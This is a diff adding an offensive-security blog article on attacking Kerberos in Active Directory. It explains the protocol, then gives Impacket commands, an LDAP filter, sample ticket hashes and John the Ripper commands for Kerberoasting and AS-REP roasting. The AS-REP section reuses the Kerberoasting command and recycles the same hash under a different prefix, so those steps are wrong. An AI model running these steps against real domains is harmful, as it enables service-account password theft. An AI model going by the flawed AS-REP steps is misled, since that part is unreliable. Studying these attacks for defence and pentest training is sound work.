@@ -1,0 +1,186 @@
+---
+title: "Kerberos Attacks"
+description: "Some ways to hack Kerberos"
+date: "2024-05-04"
+tags: ["active-directory", "kerberos", "offensive"]
+translationKey: "kerberos-attacks"
+---
+
+import Callout from "@components/Callout.astro";
+import Figure from "@components/ascii/Figure.astro";
+
+Hey, in this article I'm going to talk about the kerberos protocol and cover all the main ways of attacking it.
+
+## What is Kerberos?
+
+Before we start talking about ways to attack kerberos, we need to understand how kerberos works behind the scenes.
+
+Kerberos is an authentication protocol used in Active Directory. It operates based on tickets, instead of transmitting the password over the network. Each Domain Controller has a service called Key Distribution Center (KDC), which issues these tickets.
+
+When a user tries to log in to a resource that uses kerberos authentication (e.g. a file share), they look up the Service Principal Name (SPN) associated with the service they want to access and then request a ticket from the KDC for that SPN, encrypting their request with their password (AS_REQ). If the KDC can decrypt
+the request, this will prove its authenticity, so it will issue a Ticket Granting Ticket (TGT) and send it back to the user (AS_REP).
+
+The user then presents the TGT to the KDC, requesting a Ticket Granting Service (TGS) to access a specific service. The TGS is encrypted with the password of the service the user wants to connect to.
+
+Finally, the user presents the TGS to the desired service, requesting access. The service validates the ticket by decrypting it and, if everything is correct, access is granted.
+
+Simple, isn't it? The whole exchange fits in one picture:
+
+<Figure
+  label="fig.1"
+  caption="Kerberos authentication, six messages, three parties, no password on the wire."
+  alt="Sequence diagram of Kerberos authentication. The client sends AS_REQ, a timestamp encrypted with its password hash, to the KDC. The KDC decrypts it to prove identity and replies with AS_REP carrying a TGT encrypted with the krbtgt key. The client then sends TGS_REQ with that TGT and a target SPN; the KDC looks the SPN up and replies with TGS_REP, a ticket encrypted with the service account's key. Finally the client sends AP_REQ with that ticket to the service, which decrypts it and replies AP_REP granting access."
+>
+{`
+ client                      KDC · krbtgt                 service
+   │                              │                          │
+   │ (1) AS_REQ                   │                          │
+   │     timestamp enc. w/ hash   │                          │
+   ├─────────────────────────────>│                          │
+   │                              │ decrypts -> identity     │
+   │ (2) AS_REP                   │           proven         │
+   │     TGT, enc. w/ krbtgt key  │                          │
+   │<─────────────────────────────┤                          │
+   │                              │                          │
+   │ (3) TGS_REQ  TGT + target SPN│                          │
+   ├─────────────────────────────>│                          │
+   │                              │ resolves SPN -> account  │
+   │ (4) TGS_REP                  │                          │
+   │     TGS, enc. w/ svc acct key│                          │
+   │<─────────────────────────────┤                          │
+   │                              │                          │
+   │ (5) AP_REQ   presents TGS    │                          │
+   ├──────────────────────────────┼─────────────────────────>│
+   │                              │              decrypts it │
+   │ (6) AP_REP   access granted  │                          │
+   │<─────────────────────────────┼──────────────────────────┤
+   │                              │                          │
+`}
+</Figure>
+
+Note what never crosses the network: the password. That property is what every attack below has to work around.
+
+---
+
+## What is a Service Principal Name (SPN)?
+
+A Service Principal Name (SPN) is a unique identifier for a service in a AD environment. It helps Kerberos authentication associate a service with a account.    
+
+When a client wants to authenticate to a service (e.g., a database), Kerberos needs to know which AD account runs that service to encrypt the ticket properly.   
+
+Instead of requiring users to manually determine details like the service’s account name, an SPN acts as an alias, allowing Kerberos to get all necessary information automatically.
+
+An SPN follows this format:
+
+```
+service/hostname
+```
+
+Example:
+
+```
+HTTP/webserver.contoso.com
+#
+MSSQLSvc/sql01.contoso.com
+```
+
+So when a client requests authentication, it provides the SPN. Kerberos then looks up the corresponding account in AD and issues a ticket encrypted with its credentials.
+
+---
+
+## Kerberoasting
+
+Now that we understand the basics of how Kerberos works, let's discuss the classic Kerberoasting attack.
+
+Kerberoasting is a straightforward but powerful attack. It remains common because there is no fully effective mitigation—it exploits the protocol's design.
+
+To understand the attack, we need to remember the Ticket-Granting Service (TGS). This ticket is generated by the KDC when a user requests access to a service and is encrypted with the service's password.
+
+This means that if we have access to a user in AD, we can list all SPNs and request a TGS for each of them, receiving a ticket encrypted with the service's password. This ticket can be cracked offline, meaning we can discover the service's password without needing access to AD.
+
+Let's see how we can do this.
+
+First, let's list the SPNs of a user using the GetUserSPNs.py tool from Impacket.
+
+```bash
+python3 GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>
+```
+
+<Callout>
+    LDAP filter to list SPNs: `(&(objectCategory=user)(servicePrincipalName=*))`
+</Callout>
+
+Any user with an SPN can be attacked, as long as they have a registered SPN.
+
+<Callout>
+    The user `krbtgt` is a special user in AD that always has SPNs, but it cannot be targeted by this attack.
+</Callout>
+
+Now, let's request a TGS for a specific SPN. We can do this by using the `-request-user` option in the GetUserSPNs.py tool.
+
+```bash
+python3 GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <target>
+```
+
+Impacket will display the ticket in a format ready for password cracking:
+
+```plaintext
+$krb5tgs$23$*fileserver3$EMPRESA.LOCAL$empresa.local/Administrator*$b01abd8f5eb61b5
+e0ff4a58856621551$be74de6b7fe627bc9389049a473000000000000000dc9d711bf89f65a74c4f22f
+b77a69861cb6726b60ccf6e25eb41f87ef9807653df3a9c728cad25d5f633e68504751d00ebc9adf383
+[...]
+1b6071ce24b29d12a151bac97a2a32da995e105023c321fe8861d95111c626731e4d1833f83050f2ccb
+567df6fcca4b213a69efc92eefb12a6a1b36912d90545e9aad786e765c14714825d48481a080dc8956c
+f262923623d7f7596a229cf3f6f68f8b4d9785f99c51cec1a0ca78f25554729d1098d706f1e7d1a451b
+```
+
+We can use Hashcat or John the Ripper to crack this ticket offline.
+
+```bash
+john tgs.hash --wordlist=passwords.txt
+```
+
+The process of enumeration and TGS request can be automated with the following command to list all SPNs and request a TGS for each of them automatically:
+
+```bash
+python3 GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-all
+```
+
+---
+
+## AS_REP Roasting
+
+The AS_REP Roasting attack is similar to Kerberoasting and works by exploiting accounts where pre-authentication (pre-auth) is disabled.
+
+In a normal TGT request, the client must send an AS_REQ encrypted with its password for the KDC to respond. When pre-authentication is disabled, the KDC doesn't need the client's password to respond. This means that the KDC can respond to an AS_REQ without needing a password, allowing an attacker, even without access to an AD account, to request a TGT for any account with pre-authentication disabled.
+
+To check if an account has pre-authentication disabled, we can use the following command:
+
+```bash
+python3 GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <target>
+```
+
+If the account does not require pre-authentication, you will see something like this:
+
+```plaintext
+$krb5asrep$23$*fileserver3$EMPRESA.LOCAL$empresa.local/Administrator*$b01abd8f5eb61
+e0ff4a58856621551$be74de6b7fe627bc9389049a473000000000000000dc9d711bf89f65a74c4f22f
+b77a69861cb6726b60ccf6e25eb41f87ef9807653df3a9c728cad25d5f633e68504751d00ebc9adf383
+[...]
+1b6071ce24b29d12a151bac97a2a32da995e105023c321fe8861d95111c626731e4d1833f83050f2ccb
+567df6fcca4b213a69efc92eefb12a6a1b36912d90545e9aad786e765c14714825d48481a080dc8956c
+f262923623d7f7596a229cf3f6f68f8b4d9785f99c51cec1a0ca78f25554729d1098d706f1e7d1a451b
+```
+
+This value, like in Kerberoasting, can be cracked offline with Hashcat or John the Ripper.
+
+```bash
+john asrep.hash --wordlist=passwords.txt
+```
+
+---
+
+The goal of this article is to provide a basic understanding of how Kerberos works and how to attack it.
+I hope you found it useful. If you have any questions or suggestions for future articles, feel free to reach out.
+
+This article is not complete yet, and soon it will cover delegation attacks in detail.
